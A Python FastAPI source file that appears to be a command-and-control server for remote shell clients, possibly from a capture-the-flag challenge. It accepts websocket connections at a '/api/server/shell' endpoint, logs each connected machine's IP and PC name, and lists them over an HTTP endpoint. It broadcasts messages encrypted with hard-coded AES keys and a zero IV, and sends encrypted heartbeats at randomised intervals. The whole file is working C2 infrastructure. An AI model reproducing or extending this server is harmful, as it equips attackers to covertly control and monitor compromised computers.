from fastapi import FastAPI, WebSocket, WebSocketDisconnect, HTTPException
from contextlib import asynccontextmanager
from tiny_aes import AES, pad, unpad
from tiny_random import TinyRandom
import asyncio
import uvicorn
import logging

IV = b'\x00' * 16
AES_KEY = [
    b'O\xca\xfd\x1f[\xaa=\x1a\xa4\x80\xc4}$q[p',
    b'\x92Z7\x11\x81m\xac5r[k\x13)\xf1V\t',
    b'\x8dq\x92t\xa9\x00\xc9\x04;Z\xfe\x15\xba7R ',
    b'\xea[\xdc\xe7\xc3\xaa\x8a\xeeN\xdb\x18\x9a\xe7\xdb\xd1\x9e',
    b'\xdc\x81/\x8bf\xb6}\xab\xa0\xa4\xbe\xd4c\x0e4:',
    b'-\xd5,\xa0\xca\x0e\xfd>\x16\x8f\xd2\xb5p9\xaf\x1e',
    b'\xba\xdd\xcc\x85\xd9\xd3\xf8\xbf\xf4\x06\xd4\x1f>\x08)!',
    b'(\x87\xfb\x94X\xbeT\x8a\x04\xfd\xb2\xef\xdd.JP',
    b')(\x9eO\x17 \xb7n?\xa7L\xfag\x19\x18p',
    b'\xf0P\xe3j-~\xa9:\x04V7u\x13v\x80\x1b',
    b',\xd1\xcc\xe1K\xc8\xd4\x91X\x18b\xd9uf\xcb\xe3',
    b'q0\xfc\x96bF|\x8dN\x97\xb0l\x05_d\xfd',
    b'\x17[6\xb2b=\xfdQ\x13\r\x01\xc7qK}J'
]

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
)

@asynccontextmanager
async def lifespan(app: FastAPI):
    task = asyncio.create_task(heart_ping())
    yield
    task.cancel()
    try:
        await task
    except asyncio.CancelledError:
        logging.info("Heart ping task cancelled.")

tyrdm = TinyRandom()
tyaes = AES()
client_info = {}
app = FastAPI(lifespan=lifespan)

async def send_message(message):
    plaintext_bytes = message.encode('utf-8')
    padded = pad(plaintext_bytes)
    ciphertext = tyaes.aes_encrypt_cbc(padded, AES_KEY, IV)
    for info in client_info.values():
        websocket = info["websocket"]
        await websocket.send_text(ciphertext.hex())

async def heart_ping():
    while True:
        for info in client_info.values():
            websocket = info["websocket"]
            await websocket.send_text("2d849b4ad9eab5de4b0d270eb5176b420bf6e6ab4048af81e0244224198c1cb5500cd3d5ff89db384dbb413006dccb86")
        await asyncio.sleep(tyrdm.random(300, 600))

def get_mesgage(message_hex):
    ciphertext_bytes = bytes.fromhex(message_hex)
    decrypted = tyaes.aes_decrypt_cbc(ciphertext_bytes, AES_KEY, IV)
    unpadded = unpad(decrypted)
    return unpadded.decode('utf-8')

@app.get("/api/server/client_list")
async def client_list():
    clients = [
        {"ip": info["ip"], "from": info["from"], "pc_name": info["pc_name"]}
        for info in client_info.values()
    ]
    return clients

@app.websocket("/api/server/shell")
async def shell(websocket: WebSocket):
    required_headers = ["FRS", "FRSNode"]
    missing = [h for h in required_headers if h not in websocket.headers]
    if missing:
        raise HTTPException(status_code=403, detail=f"Missing header(s): {', '.join(missing)}")
    await websocket.accept()
    ip = websocket.client.host if websocket.client else "unknown"
    frs = websocket.headers.get("FRS")
    frsnode = websocket.headers.get("FRSNode")
    client_info[frsnode] = {
        "ip": ip,
        "from": frs,
        "pc_name": frsnode,
        "websocket": websocket,
    }
    logging.info(f"WebSocket connection accepted from {frsnode}, headers: {dict(websocket.headers)}")
    try:
        while True:
            data = await websocket.receive_text()
            logging.info(f"Received message from {frsnode}: {get_mesgage(data)}")
            await websocket.send_text(f"Message received: {data}")
    except WebSocketDisconnect:
        logging.info(f"WebSocket disconnected from {frsnode}")
    except Exception as e:
        logging.error(f"Error processing WebSocket from {frsnode}: {e}")
    finally:
        client_info.pop(frsnode, None)

if __name__ == "__main__":
    uvicorn.run(
        app,
        host="0.0.0.0",
        port=8000,
        ws_ping_interval=None
    )